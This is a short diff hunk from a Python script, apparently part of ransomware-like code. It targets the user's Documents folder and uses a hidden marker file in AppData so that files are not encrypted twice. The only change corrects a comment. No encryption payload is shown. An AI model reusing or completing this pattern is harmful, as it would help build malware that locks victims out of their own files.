@@ -11,7 +11,7 @@ path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents')
 chkfile = os.path.join(os.path.join(os.environ['USERPROFILE']), 'AppData/Roaming/Microsoft/Windows')
 
 # Check IF chkfile.txt Exist IF True Exit ELSE Decrypt
-# To Avoid Decrypting the Files Again
+# To Avoid Encrypting the Files Again
 path_name = os.path.join(chkfile, "chkfile.txt")
 if os.path.exists(path_name):
     exit()
